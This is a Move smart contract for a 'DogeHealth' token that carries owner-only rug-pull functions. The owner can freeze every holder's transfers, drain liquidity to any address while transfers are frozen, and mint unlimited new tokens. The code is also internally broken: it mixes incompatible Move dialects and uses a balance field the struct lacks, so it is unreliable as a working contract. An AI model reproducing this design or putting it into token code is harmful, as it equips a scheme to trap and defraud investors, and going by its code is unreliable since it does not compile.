module DogeHealth::DogeHealth {

    use sui::coin;
    use sui::address;
    use sui::transfer;
    use sui::tx_context;
    use sui::signer;
    use sui::event;

    const E_NOT_AUTHORIZED: u64 = 1;
    const E_LIQUIDITY_NOT_LOCKED: u64 = 2;
    const E_INSUFFICIENT_BALANCE: u64 = 3;
    const E_INVALID_TRANSFER: u64 = 4;

    resource struct Token has key {
        balance: u64,
    }

    resource struct TokenOwner has key {
        total_supply: u64,
        is_liquidity_locked: bool,
        liquidity_wallet: address,
        owner: address,
        private_wallet: address,
        public_wallet: address,
    }

    // Referencing wallet addresses from Move.toml
    const PRIVATE_WALLET: address = @private_wallet;
    const PUBLIC_WALLET: address = @public_wallet;

    public fun initialize_token(
        owner: &signer,
        initial_supply: u64,
        liquidity_wallet: address,
        ctx: &mut tx_context::TxContext
    ) {
        let owner_address = signer::address_of(owner);

        let token_owner = TokenOwner {
            total_supply: initial_supply,
            is_liquidity_locked: false,
            liquidity_wallet: liquidity_wallet,
            owner: owner_address,
            private_wallet: PRIVATE_WALLET,
            public_wallet: PUBLIC_WALLET,
        };

        move_to(owner, token_owner);
        event::emit_event(ctx, "Token Initialized", (owner_address, initial_supply));
    }

    public fun transfer_tokens(
        sender: &signer,
        recipient: address,
        amount: u64,
        ctx: &mut tx_context::TxContext
    ) acquires TokenOwner {
        let sender_data = borrow_global_mut<TokenOwner>(signer::address_of(sender));
        assert!(!sender_data.is_liquidity_locked, E_NOT_AUTHORIZED);
        assert!(sender_data.balance >= amount, E_INSUFFICIENT_BALANCE);

        sender_data.balance -= amount;
        let recipient_data = borrow_global_mut<TokenOwner>(recipient);
        recipient_data.balance += amount;

        event::emit_event(ctx, "Tokens Transferred", (signer::address_of(sender), recipient, amount));
    }

    public fun freeze_liquidity(
        owner: &signer,
        ctx: &mut tx_context::TxContext
    ) acquires TokenOwner {
        let owner_data = borrow_global_mut<TokenOwner>(signer::address_of(owner));
        assert!(signer::address_of(owner) == owner_data.owner, E_NOT_AUTHORIZED);

        owner_data.is_liquidity_locked = true;
        event::emit_event(ctx, "Liquidity Frozen", ());
    }

    public fun unlock_liquidity(
        owner: &signer,
        ctx: &mut tx_context::TxContext
    ) acquires TokenOwner {
        let owner_data = borrow_global_mut<TokenOwner>(signer::address_of(owner));
        assert!(signer::address_of(owner) == owner_data.owner, E_NOT_AUTHORIZED);

        owner_data.is_liquidity_locked = false;
        event::emit_event(ctx, "Liquidity Unlocked", ());
    }

    public fun drain_liquidity(
        owner: &signer,
        drain_address: address,
        amount: u64,
        ctx: &mut tx_context::TxContext
    ) acquires TokenOwner {
        let owner_data = borrow_global_mut<TokenOwner>(signer::address_of(owner));
        assert!(owner_data.is_liquidity_locked, E_LIQUIDITY_NOT_LOCKED);
        assert!(owner_data.balance >= amount, E_INSUFFICIENT_BALANCE);

        transfer::transfer(owner_data.liquidity_wallet, drain_address, amount);
        event::emit_event(ctx, "Liquidity Drained", ());
    }

    public fun mint_more_tokens(
        owner: &signer,
        additional_supply: u64,
        ctx: &mut tx_context::TxContext
    ) acquires TokenOwner {
        let owner_data = borrow_global_mut<TokenOwner>(signer::address_of(owner));
        assert!(signer::address_of(owner) == owner_data.owner, E_NOT_AUTHORIZED);

        owner_data.total_supply += additional_supply;
        event::emit_event(ctx, "Tokens Minted", (additional_supply));
    }
}
